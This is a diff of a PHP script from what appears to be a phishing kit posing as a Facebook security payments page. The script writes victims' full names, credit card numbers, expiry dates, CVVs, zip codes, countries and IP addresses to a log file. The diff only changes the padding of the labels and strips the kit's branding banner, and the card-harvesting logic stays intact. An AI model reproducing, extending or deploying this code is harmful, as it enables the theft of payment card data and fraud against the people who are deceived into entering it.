@@ -14,23 +14,23 @@ $today = date("F j, Y, g:i a");
 
 $handle = fopen($file, 'a');
 
-fwrite($handle, "---FACEBOOK-SECURITY-PAYMENTS-BY-MASAULIASC----");
+fwrite($handle, "---------------------------------------------------");
 
 fwrite($handle, "\n");
 
-fwrite($handle, "Full Name      : ");
+fwrite($handle, "Full Name     : ");
 
 fwrite($handle, " $ccname");
 
 fwrite($handle, "\n");
 
-fwrite($handle, "CC Number      : ");
+fwrite($handle, "CC Number     : ");
 
 fwrite($handle, " $ccnumber");
 
 fwrite($handle, "\n");
 
-fwrite($handle, "Epired Date    : ");
+fwrite($handle, "Epired Date   : ");
 
 fwrite($handle, " $month");
 
@@ -40,31 +40,31 @@ fwrite($handle, " $year");
 
 fwrite($handle, "\n");
 
-fwrite($handle, "CVV            : ");
+fwrite($handle, "CVV           : ");
 
 fwrite($handle, " $cvv");
 
 fwrite($handle, "\n");
 
-fwrite($handle, "Zip Code       : ");
+fwrite($handle, "Zip Code      : ");
 
 fwrite($handle, " $zipnumb");
 
 fwrite($handle, "\n");
 
-fwrite($handle, "Country        : ");
+fwrite($handle, "Country       : ");
 
 fwrite($handle, " $countryname");
 
 fwrite($handle, "\n");
 
-fwrite($handle, "IP Address     : ");
+fwrite($handle, "IP Address    : ");
 
 fwrite($handle, " $ip");
 
 fwrite($handle, "\n");
 
-fwrite($handle, "----------------------END----------------------");
+fwrite($handle, "---------------------------------------------------");
 
 fwrite($handle, "\n");
 
